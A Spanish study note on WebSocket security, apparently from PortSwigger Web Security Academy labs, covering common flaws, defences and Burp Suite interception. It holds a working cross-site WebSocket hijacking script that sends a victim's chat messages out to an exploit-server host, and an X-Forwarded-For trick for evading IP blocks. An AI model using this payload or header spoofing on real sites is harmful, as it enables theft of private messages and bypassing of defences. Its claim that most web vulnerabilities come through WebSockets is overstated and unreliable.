
-----------
# Definición

>**WebSocket** es un protocolo de comunicación que permite establecer una **conexión bidireccional y persistente** entre un cliente (como un navegador) y un servidor.
>
>A diferencia del protocolo HTTP tradicional —que es **unidireccional** y requiere que el cliente envíe una solicitud para recibir una respuesta—, WebSocket permite que **ambas partes envíen y reciban datos en tiempo real** sin necesidad de reabrir conexiones constantemente.

## Características principales

- Usa el *mismo puerto* que HTTP/HTTPS (80 o 443).
    
- Establece una *única conexión TCP* persistente.
    
- *Reduce* la latencia y el tráfico de red.
    
- Ideal para *aplicaciones en tiempo real* como chats, juegos online, monitoreo financiero, etc.

----------
# Vulnerabilidades comunes en WebSockets

Aunque WebSocket ofrece eficiencia y velocidad, también introduce **riesgos de seguridad** si no se implementa correctamente.  
Aquí algunas vulnerabilidades frecuentes:

## 1. Falta de autenticación o autorización

- Si no se valida la identidad del usuario antes o después de abrir la conexión, un atacante puede **conectarse y enviar mensajes no autorizados**.
    
- Es común olvidar verificar permisos dentro del canal WebSocket.
    

## 2. Cross-Site WebSocket Hijacking (CSWSH)

- Similar al **CSRF**, ocurre cuando una página maliciosa induce al navegador de la víctima a abrir una conexión WebSocket hacia un servidor legítimo **usando las cookies de sesión del usuario**.
    
- Si el servidor no valida el origen (`Origin header`), el atacante puede **interactuar con el WebSocket en nombre del usuario**.
    

## 3. Inyección de datos (WebSocket Injection)

- Si los mensajes recibidos no se validan o sanitizan, un atacante podría **inyectar comandos o scripts maliciosos**, explotando vulnerabilidades como **XSS**, **SQLi** o **command injection**.
    

## 4. Falta de cifrado (ws:// en lugar de wss://)

- Si se usa WebSocket sin TLS (`ws://`), los datos pueden ser **interceptados o modificados** por un atacante (ataques Man-in-the-Middle).
    
- Siempre se recomienda usar **`wss://`**, que cifra el tráfico.
    

## 5. Exposición de información sensible

- Los mensajes WebSocket pueden contener datos sensibles (tokens, credenciales, etc.).  
    Si no se encriptan ni se protegen, podrían **filtrarse** por registros o interceptaciones.
    

## 6. Denegación de servicio (DoS)

- Un cliente puede **mantener conexiones abiertas indefinidamente** o enviar mensajes masivos, saturando al servidor.
    
- Se recomienda limitar la cantidad de conexiones por cliente y aplicar controles de tamaño de mensaje.

-----------
# Buenas prácticas de seguridad

- Usar **`wss://`** (TLS obligatorio).
    
- Validar el **origen** (`Origin header`) y usar **tokens de autenticación**.
    
- Implementar **autenticación y autorización** dentro del canal WebSocket.
    
- **Filtrar y validar** todos los mensajes entrantes.
    
- Configurar **límites de tamaño** y tiempo de conexión.
    
- Registrar y monitorear actividad sospechosa.

------------
# Manipulación de mensajes WebSocket

Mediante BurpSuite se pueden interceptar los mensajes que se envían y reciben a través de los WebSockets.

La mayoría de las vulnerabilidades de las aplicaciones web se producen mediante los WebSockets.

Un caso concreto en el que la aplicación sanitiza la entrada del usuario y después genera un mensaje WebSocket sería vulnerable, puesto que se podría modificar el mensaje interceptado e introducir el código malicioso sin restricción.

-------------
# Cross-site WebSocket Hijacking (CSWH)

Si el WebSocket handshake no tiene protecciones como usar un CSRF-token, un atacante puede crear un socket en nombre de otro usuario, lo que le permite enviar y recibir mensajes a través de él, del mismo modo que con un ataque CSRF.

Este es un código de ejemplo que roba el socket del chat de otro usuario y lee el contenido:
``` html
<script>
const socket = new WebSocket("wss://0a2a003b04a55313800e035c008300fc.web-security-academy.net/chat");

socket.onopen = () => {
    socket.send("READY");
}

socket.onmessage = (event) => {
    data = btoa(event.data);
    fetch("https://exploit-0a9100b60401532380d902e2014a0007.exploit-server.net/?chat=" + data);
}
</script>
```

----------
# Manipulación del WebSocket handshake

Se puede manipular la petición http del WebSocket handshake, al igual que cualquier otra petición, para explotar vulnerabilidades.

Por ejemplo, si se bloquea la IP tras haber realizado un intento de ataque, se puede probar a introducir la cabecera `X-Forwarded-For` para hacerse pasar por otra IP a la hora de entablar el socket.